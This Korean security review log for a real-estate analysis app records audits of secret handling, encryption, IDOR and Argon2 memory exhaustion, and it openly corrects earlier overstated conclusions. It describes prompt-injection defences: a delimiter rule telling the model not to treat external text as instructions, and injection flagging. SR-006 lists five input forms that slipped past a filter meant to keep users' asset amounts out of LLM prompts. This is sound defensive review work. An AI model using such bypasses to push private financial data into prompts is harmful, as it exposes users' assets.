# security-review-log.md — 보안리뷰 원장

> 3단계 구현의 필수 게이트. 커밋/푸시 전 매 변경마다 기록한다.

---

## SR-001 · 2026-07-24 · 1단계 산출물 최초 커밋

**판정: PASS**

### 리뷰 범위
애플리케이션 코드는 아직 없음. 이번 변경은 **문서·설정 파일 전용**이며, 실질 위험은
**공개 GitHub 저장소(`wansoo88/realestate`, public)로의 비밀정보 유출**이므로 이에 집중해 점검함.

| 대상 | 파일 |
|---|---|
| 설정 | `.gitignore`, `.env.example` |
| 문서 | `CLAUDE.md`, `skill.md`, `docs/**` |

### 점검 항목 및 결과

| # | 항목 | 결과 | 근거 |
|---|---|---|---|
| S1 | 서버 IP·접속 계정 노출 | ✅ PASS | 실제 IP·SSH 키명·`root@` 문자열이 추적 대상 파일에 전무. `<DEPLOY_HOST>` 플레이스홀더로 치환됨 |
| S2 | 비밀정보 파일 제외 | ✅ PASS | `git check-ignore` 실검증 — `deploy-target.local.md`, `.env`, `*.key`, `id_rsa*`, `*.pem` 모두 IGNORED |
| S3 | 예외 규칙 오작동 | ✅ PASS | `.env.*` 무시 + `!.env.example` 예외가 의도대로 동작(예제 파일은 TRACKED) |
| S4 | 하드코딩된 크리덴셜 | ✅ PASS | `git diff --cached` 전수 스캔 결과 API 키·비밀번호·개인키 **값** 0건. 탐지된 3건은 `.env.example`의 빈 플레이스홀더 |
| S5 | 개인정보 커밋 | ✅ PASS | 자산·소득·대출 등 실제 개인 금융정보가 문서에 포함되지 않음 (요구사항 수준 서술만) |
| S6 | 보안 요구사항 문서화 | ✅ PASS | 컬럼 암호화·로그인 인증·HTTPS·SSH 하드닝이 `requirements.md`·`CLAUDE.md`에 명시됨 |

### 확인된 위험 (조치 예정 — 이번 커밋의 결격 사유 아님)

| ID | 위험 | 심각도 | 조치 시점 |
|---|---|---|---|
| R-01 | 배포 서버에 **root 계정 직접 SSH** 접속. 공인 IP 노출 서버는 상시 자동 공격 대상 | **High** | 2단계 `security-design` |
| R-02 | SSH 키를 타 프로젝트(autobtc)와 공용 사용 — 한쪽 유출 시 전파 | Medium | 2단계 `security-design` |
| R-03 | 포털 매물 수집의 이용약관 위반 소지 (법적 리스크) | Medium | 2단계 설계 시 공공API 이중화로 완화 |
| R-04 | 자산·소득 등 민감 컬럼 암호화 방식(pgcrypto vs 앱단 AES) 미확정 | Medium | 2단계 `db-modeling` + `security-design` |

> R-01·R-02의 구체 조치안은 `deploy-target.local.md`(저장소 밖 · git 제외)에 정리해 둠.

### 판정 사유
이번 변경에는 실행 코드가 없고, 공개 저장소 유출 벡터(S1~S5)가 모두 실측으로 차단 확인되어 **PASS**.
단, R-01~R-04는 2단계 보안설계에서 반드시 해소한다.

> ⚠️ 이 판정은 **문서 커밋 한정**이다. 3단계에서 실제 코드가 들어오면 OWASP Top 10 기준 정식 보안리뷰를 새로 수행하고, 그 전까지 이 PASS를 코드 변경의 근거로 재사용하지 않는다.

---

## SR-002 · 2026-07-24 · 팀 오케스트레이션 스크립트

**판정: PASS (제한적 — PM 자체 검토)**

### 범위
`scripts/tell.py`, `scripts/team_up.py`, `team/**`

| # | 항목 | 결과 | 근거 |
|---|---|---|---|
| S1 | 명령 인젝션 | ✅ PASS | `shell=True` 미사용, 리스트 인자 전달 |
| S2 | 비밀정보 커밋 | ✅ PASS | 스크립트·헌장·역할정의에 IP·키·계정 없음. `deploy-target.local.md` 여전히 ignore 상태 |
| S3 | 권한 경계 문서화 | ✅ PASS | CHARTER §2에 역할별 소유 영역과 금지사항, §4에 게이트 G1~G5 명시 |
| S4 | 수집 합법성 통제 | ✅ PASS | `re-data` 역할정의에 robots·rate limit·공공API 우선·이중화 규칙을 강제사항으로 기재 |
| S5 | 역할 분리 | ✅ PASS | 분석 설계자(`re-domain`)와 검증자(`re-review`) 분리, `re-review`에 거부권 부여 |

> ⚠️ **한계 명시**: PM 자체 검토이며 CHARTER §2 분리 원칙상 정식 판정이 아니다. `re-review` 가동 시 재감사한다.

---

## SR-003 · 2026-07-24 · 2단계 보안 설계

**판정: PASS (제한적 — PM 자체 검토)**

### 범위
`docs/02-design/security.md` 및 설계 전반의 보안 반영 여부.

| # | 항목 | 결과 | 근거 |
|---|---|---|---|
| S1 | SR-001 R-01 (root 직접 SSH) | ✅ **해소안 확정** | `security.md` §4.1 — 배포 전용 계정, `PermitRootLogin no`, 키 전용, 포트 변경, fail2ban |
| S2 | SR-001 R-02 (SSH 키 공용 사용) | ✅ **해소안 확정** | §4.3 — 프로젝트 전용 키 발급 |
| S3 | SR-001 R-03 (수집 법적 리스크) | ✅ **통제 확정** | §5 — 공공API 1순위, robots·rate limit, **포털 끄고도 E2E 통과** 필수 |
| S4 | SR-001 R-04 (암호화 방식 미정) | ✅ **결정 완료** | §3.1 — 앱단 AES-256-GCM 채택. pgcrypto는 키가 SQL에 실려 쿼리 로그에 남는 문제로 탈락 |
| S5 | 공개 저장소 유출 | ✅ PASS | 전수 스캔 후 `security.md`의 SSH 키 파일명 1건을 마스킹 처리. 잔여 0건 |
| S6 | IDOR (T6) | ✅ PASS | §2.2 — 모든 사용자 자원 쿼리에 `user_id` 조건 강제, 코드 예시 포함 |
| S7 | LLM 특유 위험 | ✅ PASS | §6 — 프롬프트 인젝션, 환각, **자산 원본 금액을 Claude API에 전송 금지** 명시 |
| S8 | 로그 유출 (T4) | ✅ PASS | §3.3 — 민감 필드 목록, 프로덕션 스택트레이스 변수 덤프 비활성화 |
| S9 | 백업 (T3) | ✅ PASS | §3.4 — 앱단 암호화로 덤프가 유출돼도 복호화 불가, 오프사이트 필수, 분기 복구 훈련 |
| S10 | 3단계 게이트 기준 | ✅ PASS | §7 — 10개 항목 체크리스트로 `security-review` 판정 기준 확정 |

### 이번 검토에서 실제로 고친 것
- `security.md` §4.3에 SSH 키 파일명이 평문 노출 → 공개 저장소 대상이므로 마스킹.
  (키 이름 자체는 비밀이 아니지만, 저장소에 접속 관련 식별자를 남기지 않는다는 자체 원칙 준수)

### 잔여 위험 (수용 · `security.md` §8)
| ID | 내용 | 판단 |
|---|---|---|
| R-05 | 단일 서버 침해 시 전면 노출 | 수용 (개인용) |
| R-06 | 암호화 키가 같은 서버 `.env`에 존재 | 수용. **DB만 유출되는 흔한 사고는 확실히 차단**되나 서버 장악 시에는 무력함을 문서에 정직하게 기재 |
| R-07 | 포털 수집 약관 해석 여지 | 완화(공공API 이중화). 서비스 성격 변경 시 재검토 |
| R-08 | LLM 환각 | G2 감사로 완화, 완전 제거 불가 → 면책 고지 유지 |

> ⚠️ **한계 명시**: PM 자체 검토. herdr 복구 후 `re-review`가 재수행한다.
> 특히 **G2(근거 감사)** 는 설계 문서가 아니라 3단계 구현물을 대상으로 해야 실효가 있다.

---

## SR-004 · 2026-07-24 · 3단계 구현 1차

**판정: PASS (제한적 — PM 자체 검토 · 미검증 영역 명시)**

### `security.md` §7 체크리스트 전수 확인

| # | 항목 | 결과 | 확인 방법 |
|---|---|---|---|
| 1 | `user_id` 조건 없는 사용자 자원 쿼리가 없는가 | ✅ | 리포지토리 인터페이스가 `user_id` 를 **필수 인자로 강제**. `get_job(job_id)` 시그니처 자체가 존재하지 않음. `test_남의_추천결과는_조회할_수_없다` 로 실증 |
| 2 | 자산 3종이 암호화 저장되는가 (평문 컬럼 0개) | ✅ | grep 결과 `user_profile` 에 평문 금액 컬럼 0건. `test_저장소에_평문_금액이_남지_않는다` 가 암호문에 평문 바이트가 없음을 확인 |
| 3 | `/me/profile`·`/affordability` 본문이 로그에서 제외되는가 | ✅ | **본문은 어떤 경로에서도 로그하지 않음.** 민감 경로는 쿼리스트링까지 제거. `test_민감경로는_쿼리스트링을_로그에_남기지_않는다` |
| 4 | Claude API 프롬프트에 원본 금액이 없는가 | ⚠️ **N/A** | 에이전트 오케스트레이션(T7) 미구현. **구현 시 반드시 재확인** |
| 5 | 원시 SQL 문자열 조합이 없는가 | ✅ | grep 결과 0건 (현재 SQL 실행 코드 자체가 없음 — PostGIS 구현 시 재확인) |
| 6 | `db`·`redis` 에 `ports:` 가 없는가 | ✅ | `docker-compose.yml` 파싱 검증. 추가로 `data` 네트워크를 `internal: true` 로 이중 차단 |
| 7 | `.env`·키·백업이 커밋되지 않았는가 | ✅ | 전수 스캔 0건. `.gitignore` 검증 완료 |
| 8 | 세율이 출처·기준일자를 가진 설정으로 관리되는가 | ✅ | 로더가 `source`·`source_url`·`as_of` 누락 시 **로딩 거부**. `test_출처가_없으면_거부한다` |
| 9 | 수집기가 robots·rate limit 을 준수하는가 | ⚠️ **부분** | rate limit·지수 백오프는 구현·테스트 완료. **robots.txt 파서는 미구현** (포털 수집 착수 전까지 불필요하나 착수 시 필수) |
| 10 | 포털 소스를 끄고도 서비스가 동작하는가 | ✅ | 현재 공공API 수집기만 존재 — 구조적으로 만족. 포털 추가 시 E2E 로 재확인 |

### 추가로 확인한 항목

| 항목 | 결과 | 근거 |
|---|---|---|
| AAD 바인딩 (암호문 이동 공격) | ✅ | `test_다른_사용자로는_복호화되지_않는다`, `test_다른_필드로는_복호화되지_않는다` |
| 암호문 무결성 | ✅ | `test_변조된_암호문은_거부된다` (AES-GCM 태그) |
| nonce 재사용 | ✅ | `test_같은_값도_매번_다른_암호문` |
| Argon2id 사용 | ✅ | `test_argon2id_사용` |
| JWT `alg=none` 공격 | ✅ | `test_알고리즘_none_공격_차단` |
| refresh 토큰으로 API 호출 | ✅ 차단 | `test_refresh_토큰으로_API_호출_불가` |
| 계정 열거 | ⚠️ **부분** | 응답 **본문·상태코드**로는 구분 불가(`test_존재하지_않는_계정과_틀린_비밀번호가_같은_응답`). **단 타이밍(34ms vs 2ms)과 `register` 409 `EMAIL_TAKEN` 으로는 구분 가능 — SR-010/`SR10-1` 에서 정정. 당초 '차단' 판정은 응답 본문만 본 과잉 주장이었다.** |
| 운영 모드 스키마 노출 | ✅ 차단 | `DEBUG=false` 면 `/api/docs`·`openapi.json` 404 |
| 보안 헤더 | ✅ | HSTS·nosniff·DENY·no-referrer |
| 오류 응답의 정보 노출 | ✅ | 복호화 실패·토큰 오류에 사유를 구체적으로 알려주지 않음(오라클 방지) |
| 설정 미비 시 동작 | ✅ | 키 없으면 **평문 폴백 대신 503**. 세율 미검증이면 **추정 대신 503** |

### 이번 검토에서 실제로 고친 것
- `NO_BODY_LOG_PATHS` 가 선언만 되고 사용되지 않아 §3.3 요구사항이 **문서에만 존재**했다.
  → 접근 로그 미들웨어로 구현하고 회귀 테스트 추가.

### ⚠️ 미검증 · 이월

| ID | 내용 | 조치 시점 |
|---|---|---|
| SR4-1 | 실제 DB(PostGIS) 접근 코드 미작성 → SQL 인젝션 검증 불가 | PostGIS 리포지토리 구현 시 |
| SR4-2 | Claude API 프롬프트 구성 미구현 → 자산 금액 유출 여부 미검증 | T7 구현 시 (**최우선 재검토 대상**) |
| SR4-3 | robots.txt 파서 미구현 | 포털 수집 착수 전 필수 |
| SR4-4 | 앱 레벨 로그인 시도 제한 미구현 (nginx rate limit 만 존재) | 배포 전 |
| SR4-5 | 서버 하드닝(§4) 미적용 — 설계만 존재 | 배포 시 (사람 승인 G5) |

> ⚠️ **한계**: PM 자체 검토. herdr 복구 후 `re-review` 재감사 필요.
> 특히 **SR4-2(자산 금액이 외부 LLM 으로 나가는지)** 는 이 프로젝트에서 가장 위험한 지점이므로
> T7 구현 시 독립 검증이 반드시 필요하다.

---

## SR-005 · 2026-07-24 · 에이전트 오케스트레이션 (T7)

**판정: PASS (제한적 — PM 자체 검토)**

> 🔺 **정정 (2026-07-25, re-review SR-006/SR-007)**: 아래 SR4-2 "해소" 서술은 **과장이었다.**
> `assert_no_secrets`는 자산유출을 "기계적으로 차단"하지도, "기억 의존을 제거"하지도 못했다 —
> re-review 가 5/5 우회·기본값 no-op·정상시세 오차단을 실측(SR-006). **진짜 방어는 이 가드가
> 아니라 구조(원본을 finding 에 넣지 않음)** 였다. re-domain 이 08-domain 에서 가드를 값비교로
> 강화 + fail-loud + 문서 정정하고, re-review 가 SR-007 에서 재검증해 **SR4-2 를 정식 CLOSE** 했다.
> 아래 원문은 이력 보존을 위해 남기되, 취소선 취지로 읽을 것.

### SR-004 의 최우선 이월 항목 해소

| ID | 내용 | 결과 |
|---|---|---|
| **SR4-2** | Claude API 프롬프트에 자산 원본 금액이 나가는가 | ✅ ~~해소~~ → **과장, SR-006 반려 후 SR-007 에서 CLOSE** |

`security.md` §6 규칙("자산 원본 금액을 프롬프트에 넣지 않는다")을 **문서가 아니라 코드로** 강제했다.

```python
assert_no_secrets(user_prompt, forbidden_amounts)   # 호출 직전 기계적 차단
```
- ~~콤마·공백 표기를 우회하지 못하도록 **숫자만 남겨 비교**한다 (`300,000,000` 도 탐지)~~
  → **오류였다**: "숫자만 남겨" 방식은 억/만원/한글 표기를 못 잡고, substring 이라 13억이 3억을
  오차단했다. SR-007 에서 값비교(`extract_amounts`)로 교체됨을 확인.
- 100만원 미만은 우연한 일치를 피해 검사 제외 (층수·세대수 오탐 방지) — 이 부분은 유지됨
- 실제 파이프라인을 돌려 LLM 에 전달된 텍스트를 직접 검사하는 테스트 존재
  (`test_파이프라인_프롬프트에_자산금액이_없다`) — **이것이 실제 방어였다(구조 검증)**

> ~~사람이 규칙을 기억하는 것에 의존하지 않는다. 언젠가 잊기 때문이다.~~
> → **정정**: 가드 자체는 기본값 no-op 이라 오히려 거짓 안전감을 줬다. 기억 의존을 실제로 없앤 것은
> ① 원본을 finding 에 안 싣는 구조 ② 그걸 고정하는 파이프라인 테스트 ③ (SR-007 후) fail-loud 기본값.

### 프롬프트 인젝션 (security.md §6)

| 항목 | 결과 | 근거 |
|---|---|---|
| 외부 텍스트의 구조적 분리 | ✅ | `data_block()` 이 구분자로 감싸고 "지시로 해석 말라"를 명시 |
| 인젝션 시도 탐지·로깅 | ✅ | `scan_injection()` — **차단이 아니라 표시**(정상 문서 오탐 방지) |
| LLM 출력 스키마 검증 | ✅ | 스키마 이탈 시 **폐기 후 규칙 기반 폴백**. `test_LLM이_스키마를_벗어나면_폐기한다` |

### 환각 방지 (G2)

| 항목 | 결과 | 근거 |
|---|---|---|
| `evidence` 없는 finding 저장 거부 | ✅ | `validate_finding` 이 예외. `test_근거가_없으면_저장을_거부한다` |
| 추정 기반 신뢰도 상한 강제 | ✅ | `basis=estimated_from_location` 이면 `confidence` 를 0.6 으로 **자동 하향** |
| 단점(`why_not`) 누락 방지 | ✅ | LLM 이 비워 보내면 **우리가 risks 로 채운다**. 장점만 있는 리포트는 안 나간다 |
| 데이터 없을 때 | ✅ | 지어내지 않고 `판단 보류` + `missing` 반환 |
| LLM 장애 시 | ✅ | 규칙 기반 폴백 — 문장은 투박해도 **근거는 정확하다** |
| 미구현 기능 은폐 | ✅ | MVP 는 `timing_signal: "unknown"` 을 명시. 있는 척하지 않는다 |

### 잔여 (다음)
| ID | 내용 |
|---|---|
| SR5-1 | `AnthropicLLM` 실호출 미검증 (API 키 없음) — 배포 전 스모크 테스트 필요 |
| SR5-2 | LLM 응답 토큰/비용 상한 미설정 — 폭주 방지 장치 필요 |

---

## SR-006 · 2026-07-25 · **re-review 독립 재감사** (지시 2026-07-25-05-review)

**판정: SR4-2 반려(FAIL) · 그 외(G2·G3·G4·IDOR) CONFIRM PASS**
검증자: `re-review`. 방법: 문서 판독이 아니라 **함수를 직접 호출해 깨봤다**(실측 스크립트).

> ⚠️ **먼저 오해 방지**: 현재 커밋된 코드에 **활성 자산유출 경로는 없다.** 아래 SR4-2 반려는
> ① SR-005의 "해소" 서술이 과장이고 ② T7이 실서비스 경로에 배선될 때 뚫릴 수 있는 잠복
> 결함이라는 뜻이다. 지금 착취 가능한 취약점이 아니다.

### 1) SR4-2 재검증 — `assert_no_secrets` 를 5가지로 깨봤다 (지시 최우선)

SR-005는 이 함수가 자산유출을 **"기계적으로 차단"** 하며 **"사람이 규칙을 기억하는 것에 의존하지
않는다"** 고 선언했다. **둘 다 사실이 아니다.** 실측 결과:

| # | 우회 방법 | 프롬프트 예 | 결과 |
|---|---|---|---|
| A1 | 억 단위 표기 | `"3억"` | **누출**(통과) — 숫자만 남기면 "3" |
| A2 | 만원 단위 표기 | `"30000만원"` | **누출** — "30000" |
| A3 | 한글 수사 | `"삼억원"` | **누출** — 숫자 0개 |
| A4 | 파생값(월상환액) | `"3,000,000원"` | **누출** — `forbidden_amounts`에 없음 |
| A5 | **빈 forbidden(프로덕션 기본값)** | 원본 콤마표기 그대로 | **누출** — `AnalysisContext.forbidden_amounts` 기본값 `[]` → 검사 루프가 아예 안 돔 |
| (대조) A6 | 원본 콤마표기 + forbidden 채움 | `"300,000,000"` | 차단 ✅ (SR-005가 주장한 유일한 케이스만 참) |
| (부작용) A7 | 정상 시세 13억 | `"1,300,000,000"` | **오차단** — 현금 3억이 substring 으로 걸림(가용성 결함) |

→ **우회 5/5 성공.** 특히 A5: 프로덕션에서 `forbidden_amounts`를 채워 넘기는 호출자가 없으면
(현재 `run_mvp_pipeline`을 부르는 실경로 자체가 없음) 이 가드는 **완전한 no-op**이다.

### 2) 그럼 왜 활성 유출이 아닌가 — 진짜 방어는 따로 있다

실제 보호는 `assert_no_secrets`가 아니라 **구조적 설계**다:
- `AnalysisContext`가 자산 원본을 담지 않고 `AffordabilityResult`(파생값)만 가진다.
- `finance_finding`이 `to_dict`로 프롬프트에 싣는 값은 `max_purchase`·`costs.total`·
  `binding_constraint` 등 **계산 결과뿐**. `usable_cash`(=원본 현금)는 finding에 없다.
- 이 사실을 `test_파이프라인_프롬프트에_자산금액이_없다`가 실제 파이프라인을 돌려 검증한다.

이 구조적 방어는 **유효하고 테스트로 고정되어 있다.** 여기에 오케스트레이터가 아직 실경로에
배선되지 않았고(`worker.py` 미구현) 세율 config 미검증으로 관련 엔드포인트가 503이라
**현재 유출은 없다.**

### 3) 반려 사유와 통과 조건

**반려**: SR-005의 "SR4-2 해소 — 기억에 의존하지 않는 차단" 서술이 **실측과 배치**된다.
가드는 보조망일 뿐이며, 오히려 **거짓 안전감**을 준다. T7이 실경로에 붙는 순간, 미래 개발자가
UX 목적으로 finding에 원본 금액(예: 자기자본)을 한 줄 넣으면 기본값 no-op으로 조용히 샌다.

**통과 조건(T7 실경로 배선 전 필수):**
1. **원장·주석 정정** — 1차 방어는 "finding은 파생값만 싣는다"(구조+테스트)임을 명시하고,
   `assert_no_secrets`는 best-effort tripwire로 격하 표기.
2. **기본값 fail-loud** — `llm is not None`인데 `forbidden_amounts`가 비면 통과가 아니라
   **예외**. 또는 affordability 입력에서 검사값을 내부에서 파생.
3. **매칭 강화** — 순진한 substring 대신 토큰/단어경계 + 단위(억/만원) 정규화 →
   우회(A1·A2·A4)와 오차단(A7) 동시 해소.
4. **회귀 테스트 추가** — finding에 원본 자산이 섞이면 LLM 도달 전에 잡히는지 검증.

### 4) G3 개인정보 — CONFIRM (깨보았으나 뚫리지 않음)

| 점검 | 시도 | 결과 |
|---|---|---|
| AAD 바인딩 | 타 user_id/타 field로 복호화 | `InvalidTag`→`DecryptionError` (기존 테스트 재현) ✅ |
| nonce 재사용 | `encrypt_amount` 반복 호출 | 매회 `os.urandom(12)` — 동일값도 상이 암호문 ✅ |
| 복호화 오라클 | 실패 사유 노출 여부 | 전부 `"복호화에 실패했습니다"` 일반 메시지 ✅ |
| 키 강도 | 잘못된 길이 키 | `load_key`가 `ValueError`로 기동 차단(평문 폴백 없음) ✅ |
| 로그 유출 | 민감경로·본문·예외 | `SENSITIVE_PATHS` 쿼리제거 + 본문 미로깅 + 예외 URL 마스킹 ✅ |

**G3 CONFIRM PASS.** 자산 3종 평문 컬럼 0, 앱단 AES-256-GCM + AAD, 로그 마스킹 유효.

### 5) IDOR — CONFIRM

- `get_job(job_id, user_id)`가 리포지토리 내부에서 `job.user_id != user_id → None` 강제.
- 프로필·선호 전 메서드가 `user_id` 키. 라우터는 항상 인증 토큰의 `user.id`만 사용 —
  **요청 body/path/query에서 사용자 식별자를 받는 경로 0건**(전수 확인).
- `get_job(job_id)` 같은 무방비 시그니처는 Protocol 단계에서 **애초에 존재하지 않음**.

**IDOR CONFIRM PASS.**

### 6) G2 근거감사 — CONFIRM (경미한 hardening 1건)

| 점검 | 결과 |
|---|---|
| evidence 없는 finding 저장 | `validate_finding`이 예외(단 `missing` 있으면 판단보류 허용) ✅ |
| 추정 신뢰도 상한 | `basis=="estimated_from_location"`이면 confidence 0.6 자동 하향 ✅ |
| LLM 환각 | 폴백은 하위 finding의 rationale·risks만 사용 — 새 사실 창작 없음 ✅ |
| why_not 누락 | LLM이 비우면 risks로 백필 — 장점만 있는 리포트 차단 ✅ |
| 스키마 이탈 | 폐기 후 규칙 폴백 ✅ |

- **경미(비차단)**: 신뢰도 상한이 `basis` 문자열 **정확 일치**에만 발동. 다른 추정 라벨
  (예: `"estimated"`)을 쓰면 캡을 우회. 현재 호출자는 정확 문자열만 써 문제없으나,
  라벨 상수화 또는 접두 매칭 권장.

**G2 CONFIRM PASS.**

### 7) G4 / config 방어 — CONFIRM + 강화 확인 (READY 우려 실측)

READY 보고의 "세율 공란 방어가 실제로 뚫리는가"를 실측:
- `tax_rules.yaml` = `status: unverified`, 모든 `rate_pct: null`.
- `load_rules(..., allow_unverified=False)` → **거부(19 problems)**.
- `load_rules(..., allow_unverified=True)` → **여전히 거부(18 problems)** — `allow_unverified`는
  status 검사만 건너뛰고 `rate_pct=null`·출처누락은 **항상** 막는다.
- ∴ **빈 config로 계산되는 경로가 (테스트 우회 포함) 존재하지 않는다.** `get_rules`→503.

**방어는 뚫리지 않는다. G4 CONFIRM PASS.**

### 종합
- **CONFIRM PASS**: G1(코드리뷰, CR-007) · G2 · G3 · G4 · IDOR.
- **반려(FAIL)**: SR-005의 **SR4-2 "해소" 주장** — 가드 5/5 우회, 프로덕션 기본값 no-op.
  현재 활성 유출은 없으나(구조적 방어가 실제 보호), **T7 실경로 배선 전 위 4개 통과조건 충족 필수.**
- 실측 스크립트·원자료는 재현 가능(세션 스크래치패드). 같은 입력에 같은 결과.

---

## SR-007 · 2026-07-25 · **SR4-2 재검증 — re-domain 08-domain 수정 (반려 당사자 재감사)**

**판정: PASS — SR4-2 CLOSE.** (지시 2026-07-25-09-review)
검증자: `re-review`(SR-006 반려 당사자). 방법: 문서 재확인이 아니라 **함수·파이프라인을 직접
실행**해 SR-006 에서 뚫었던 5가지 우회를 재실측하고, 새 우회를 추가로 탐침. 전체 **239 passed**
(29 skipped=PostGIS/DB 요구) 재현, 회귀 0.

### 1) SR-006 에서 뚫었던 5가지 우회 재실측 (이제 차단되는가)

| # | 우회 | SR-006(수정 전) | SR-007(수정 후) 실측 | 근거 |
|---|---|---|---|---|
| A1 | 억 단위 `3억` | 누출 | **차단** | `extract_amounts` 단위정규화 → 300,000,000 값비교 |
| A2 | 만원 `30000만원` | 누출 | **차단** | 30000×만 = 300,000,000 |
| A3 | 한글 `삼억원` | 누출 | **차단** | 한글 한자리 수사 파싱 |
| A4 | 원본이 finding 에 유입 | (개념) | **차단** | `test_A4…` — 원본 섞인 finding → `PromptSafetyError`, `llm.calls==[]` |
| A4' | 파생값(월상환액) | 누출 | **통과(정상)** | 파생값은 원래 LLM 에 가도 되는 값 — 구조상 원본 아님 |
| A5 | 빈 `forbidden`(기본값) | 누출(no-op) | **fail-loud 예외** | `portfolio_summary`가 `[]`·`[500]` 에 `PromptSafetyError`, LLM 미호출 |

→ 내가 뚫었던 경로가 **전부 막혔다.** (A4' 파생값 통과는 설계상 정상 — 반려 사유가 아니었음)

### 2) 오차단(A7) 회귀 — 정상 시세 13억이 자산 3억으로 걸리는가

- `assert_no_secrets("실거래 1,300,000,000원", [300_000_000])` → **통과**(오차단 없음) ✅
- `assert_no_secrets("실거래 13억", [300_000_000])` → **통과** ✅
- `extract_amounts("현금 3억, 시세 1,300,000,000원, 30000만원")` → `{…300000000…1300000000…}`
  **두 값이 별개로 분리**. substring 오탐 제거 확인 ✅

### 3) 구조적 방어(실제 1차 방어) 실측

실제 파이프라인을 돌려 LLM 에 전달된 `user` 프롬프트를 캡처해 검사:
- 추출 금액에 원본 현금(3억) 포함 여부: **False**
- 프롬프트 문자열에 `"3억"` / `"300000000"` 존재: **둘 다 False**
- `_derive_forbidden(빈 ctx)` = `[280,000,000]` (usable_cash=현금−예비비2천만) → **호출자가 잊어도
  tripwire 자동 무장**. 그래도 비면 fail-loud.

### 4) 5개 통과조건 판정

| 통과조건(SR-006) | 판정 | 근거 |
|---|---|---|
| ① 원장·주석 정정(구조가 1차 방어) | ✅ | `base.py` docstring + `docs/domain/prompt-safety-defense-model.md` 가 SR-005 과장 정정, 구조를 1차로 명시. 본 원장 SR-005 도 정정 표기함 |
| ② 기본값 fail-loud | ✅ | `portfolio_summary` no-op 제거(예외) + `_derive_forbidden` 파생 무장. 실측 확인 |
| ③ 매칭 강화(substring→값/단위) | ✅ | `extract_amounts` 값비교. A1·A2·A3 차단, A7 오차단 해소 |
| ④ 회귀 테스트 | ✅ | `test_A1/A2/A3/합성/A7/A5/A4/보강/라벨접두` 10건 pass |
| ⑤ (G2 경미) basis 접두매칭 | ✅ | `ESTIMATED_BASIS_PREFIX` 접두 매칭으로 라벨변형 캡 우회 차단. `test_추정라벨_변형도_신뢰도가_캡된다` |

### 5) 잔여(비차단) — tripwire 한계, 구조가 막으므로 CLOSE 를 막지 않음

내가 추가로 탐침한 신규 우회 중 tripwire 가 못 잡는 것:
- `십억`(복합 한글 수) — **doc 에 이미 한계로 명시**
- `300 000 000`(공백 자릿수) — **doc 에 이미 명시**(무관 숫자 병합 회피 목적)
- `3.0억`(소수+억) — **doc 미기재**. 권고: `prompt-safety-defense-model.md` 한계 목록에 1줄 추가.

이들은 **tripwire(보조 그물)의 불완전성**이지 **구조적 방어의 구멍이 아니다.** 원본은 finding 에
구조적으로 들어가지 않고(§3 실측), tripwire 는 문서가 "의존하지 말라"고 명시한 best-effort 다.
SR4-2 CLOSE 의 근거는 tripwire 완전성이 아니라 **구조+테스트+fail-loud+정직한 문서**다.

### 판정
**SR4-2 CLOSE (PASS).** SR-006 의 4개 통과조건 + G2 접두매칭까지 모두 충족. 반려 당사자로서
직접 실행해 확인했고, 재현 가능하다. `3.0억` tripwire 미기재 1건은 **비차단 권고**로만 남긴다.
`.review-state.json::open_findings[SR4-2]` 를 `resolved` 로 전환한다.

---

## SR-008 · 2026-07-25 · 신규 발견 — Argon2 메모리 고갈 (re-review, CR-009 파생)

**판정: 신규 OPEN 발견 `SR8-1` · 커밋 게이트는 통과 유지 · 배포(G5) 차단 조건**

CR-009(CR-008 재검증) 중 전체 테스트를 8회 반복하다 1회 관측된 실패에서 출발했다.
flaky 로 넘길 사안이 아니라 **CR-008 이 스스로 기록한 배포서버 실측치와 정면으로 충돌**한다.

### 발견 경위
`tests/test_security.py::test_비밀번호_해시_검증` → `argon2.exceptions.HashingError:
Memory allocation error`. 8회 중 1회. 개발 PC(RAM 여유 충분)에서 발생했다.

### 실측 근거 (직접 실행)

| 항목 | 실측값 | 확인 방법 |
|---|---|---|
| `PasswordHasher()` `memory_cost` | **65536 KiB = 64 MiB / 해시 1회** | `app/core/security.py:44` 는 인자 없는 기본 생성 |
| `time_cost` / `parallelism` | 3 / 4 | 동일 |
| 해시 1회 소요 | **약 70 ms** (이 동안 64 MiB 점유) | 직접 측정 |
| 인증 라우트 형태 | `def register` / `def login` — **sync** (`app/api/routes.py:60,72`) | Starlette 가 스레드풀에서 실행 |
| anyio 기본 스레드풀 한도 | **40** (앱이 조정하지 않음 — `total_tokens` 오버라이드 없음) | 직접 측정 |
| nginx 인증 rate limit | `rate=1r/s`, **`burst=5 nodelay`** (`deploy/nginx.conf:8,40`) | 소스 확인 |
| docker-compose 메모리 제한 | **없음** (`mem_limit`·`deploy.resources` 미설정) | 소스 확인 |
| 배포 VPS 여유 메모리 | **332 MB** | **CR-008 이 직접 기록한 실측치** |

### 왜 문제인가
- **단일 IP 가 rate limit 을 지켜도** `burst=5 nodelay` 로 5건 동시 인증 요청이 통과한다
  → `5 × 64 MiB = 320 MiB`. 이는 **CR-008 이 측정한 VPS 여유 메모리 332 MB 를 거의 정확히 소진**한다.
- 그 332 MB 는 **pjt13 스택이 뜨기 전** 값이다. postgres·redis·backend·nginx·frontend 가
  올라가면 여유는 **더 줄어든다.** 즉 실제 여유는 320 MiB 보다 작다.
- 스레드풀 한도 40 이므로 이론적 최대는 `40 × 64 MiB = 2.56 GB`. compose 에 메모리 제한이
  없으므로 컨테이너가 이를 막지 못한다.
- 해당 VPS 는 **autobtc·itsmine 이 운영 중인 실서비스 서버**다. OOM 발생 시 pjt13 뿐 아니라
  **동거 중인 타 서비스가 OOM-killer 대상이 될 수 있다.**
- `HashingError` 는 **어디서도 처리되지 않는다**(`grep HashingError` → 0건).
  → `main.py:72` 전역 핸들러가 500 으로 잡는다.

### 정보 유출은 없음 (G3 유지)
전역 핸들러가 스택트레이스·로컬변수를 응답에 싣지 않고 `{"code":"INTERNAL"}` 만 반환한다
(`app/main.py:72-80`). **유출 없음 확인.** 문제는 기밀성이 아니라 **가용성**이다.

### 통과 조건 (배포 전 필수)
1. `PasswordHasher(memory_cost=..., time_cost=..., parallelism=...)` 를 **명시 설정**한다.
   OWASP Password Storage Cheat Sheet 의 Argon2id 권장 하한은 **19 MiB / t=2 / p=1** 이므로
   기본값(64 MiB)을 낮춰도 **권장 기준을 만족**한다. 19 MiB 기준 5동시 = 95 MiB 로 3.4배 여유.
2. `docker-compose.yml` 의 backend 에 **메모리 제한을 명시**해 동거 서비스로 피해가 번지지 않게 한다.
3. 인증 경로 동시성을 스레드풀 40 이 아니라 **의도한 값으로 제한**한다(전용 세마포어 등).
